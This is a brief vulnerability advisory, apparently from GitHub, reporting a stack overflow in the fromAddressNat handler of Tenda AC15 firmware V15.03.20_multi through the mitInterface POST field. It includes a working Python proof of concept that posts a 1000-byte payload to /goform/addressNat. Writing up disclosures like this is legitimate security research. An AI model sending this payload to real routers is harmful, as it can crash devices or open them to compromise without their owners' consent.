## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `fromAddressNat` function. The `v8` variable receives the `mitInterface` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `v8` can trigger this security vulnerability.

![image-20240314180844765](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314180844765.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addressNat"
payload = b"a"*1000

data = {"mitInterface": payload}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314180825277.png)
